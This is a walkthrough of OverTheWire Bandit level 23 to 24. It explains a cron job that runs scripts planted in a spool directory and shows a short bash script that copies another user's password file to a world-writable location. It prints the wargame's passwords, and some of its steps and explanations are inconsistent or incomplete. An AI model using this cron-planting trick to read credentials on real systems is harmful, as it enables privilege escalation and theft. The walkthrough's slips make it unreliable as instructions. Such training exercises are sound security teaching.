# Bandit Level 23 -> Level 24 #

https://overthewire.org/wargames/bandit/bandit24.html

## SSH Access Details ##
**Username:**  bandit23

**Password:**  QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
#

## Level Goal : ##
>A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.
>
>**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
>
>**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Commands you may need to solve this level : ##
cron, crontab, crontab(5) (use “man 5 crontab” to access this)


#  
## PROCEDURE : ##

Similarly to our previous two tasks, we can start by looking at the contents of the `/etc/cron.d` directory and at the contents of `cronjob_bandit24` since that is the user for which we are trying to discover the password.
```console
bandit23@bandit:~$ ls /etc/cron.d
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

We can see that a script `/usr/bin/cronjob_bandit24.sh` is being run every minute, and we can use the command `cat /usr/bin/cronjob_bandit24.sh` to see what the bash script contains:

```bash
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

Let's break-down this code line-by-line
- `#!/bin/bash`: Declares this file as a bash script
- `myname=$(whoami)`: Runs the `whoami` command and saves it to a variable called `$myname`  in our case this variable will contain `bandit24` since that is username for the user running the script (and therefore the output of the `whoami` command)
- `cd /var/spool/$myname/foo`: Changes the working directory to `/var/spool/bandit24/foo`
- `echo "Executing and deleting all scripts in /var/spool/$myname/foo:"`: Output a message to screen that says that all scripts in `/var/spool/bandit24/foo` are being deleted.
- `for i in * .*;`: A **for loop** is initiated to iterate through all the files in the directory (`.*`)
  -  `if [ "$i" != "." -a "$i" != ".." ];` This checks to see whether the current file being looked at by the for loop is called `.` or `..` in which case they are ignored.  `.` represents the current directory, i.e. `foo` and `..` represents the parent directory, i.e. `bandit24`.
  - Provided that the file is neither of these two, the following actions are performed:
      -  `echo "Handling $i"`: Outputs the filename of the file being handled to screen
      -  `owner="$(stat --format "%U" ./$i)"`: Stores information about the owner of a the file in a variable called `$owner`
      -  `if [ "${owner}" = "bandit23" ]; then`: Checks whether the owner of the file is `bandit23`.  If it is, it will perform the following:
          -  `timeout -s 9 60 ./$i`: **It will execute the file** using `./$i` (remember that `$i` contains the filename of the current file in the for loop).  The script then waits 60 seconds before sending a KILL command to terminate the process (`9` is an alias for the KILL command).    
- ` rm -f ./$i` Provided that the filename is not `.` or `..` and that the owner is not `bandit23`, the file is deleted


This is a very interesting discovery as we now know that any script file created by the user `bandit23` (that's us) in the folder `/var/spool/bandit24/foo` will be executed once every minute by this cronjob and what's more - it will be executed as the user `bandit24`!

Now it's just a matter of taking what we learnt in the previous two tasks and putting it together to build our own script.  It's also important to keep in mind what user will be runnign this script and what file permissions each user has.

Let's start by creating a temporary directory we can work in using `mkdir` and creating two files inside called `gimmepass.sh` (which will be our script file) and `password` which will be our output file.
```console
bandit23@bandit:~$ mkdir /tmp/gimmepass
bandit23@bandit:~$ cd /tmp/gimmepass
bandit23@bandit:/tmp/gimmepass$ touch password
bandit23@bandit:/tmp/gimmepass$ touch gimmepass.sh
```

Now we can use `nano` as our text editor to edit the script file

```console
bandit23@bandit:/tmp/gimmepass$ nano gimmepass.sh
```

The bash script itself is a simple one-line script that takes the contents of `/etc/bandit_pass/bandit24` and outputs them to the `password` file we created earlier.
```bash
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/gimmepass/password
```

Now, keep in mind that `gimmepass.sh` and `password` as well as the whole `/tmp/gimmepass` directory was created by our user; `bandit23`.  On the other hand, the cronjob will be run by user `bandit24` which doesn't have write permissions to this directory.  We can fix this by granting write permissions to this directory and its contents to all the users using the `chmod` command:

```console
bandit23@bandit:/tmp/gimmepass$ chmod 777 -R /tmp/gimmepass
```

Now we just have to wait a minute or two until the next scheduled cronjob runs and executes our script.  We can keep looking inside the `password` file until it is updated with the password for `bandit24`:

```console
bandit23@bandit:/tmp/gimmepass$ cat password
bandit23@bandit:/tmp/gimmepass$ cat password
bandit23@bandit:/tmp/gimmepass$ cat password
bandit23@bandit:/tmp/gimmepass$ cat password
bandit23@bandit:/tmp/gimmepass$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```



QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G


And - as expected - it contains the password for `bandit23`.
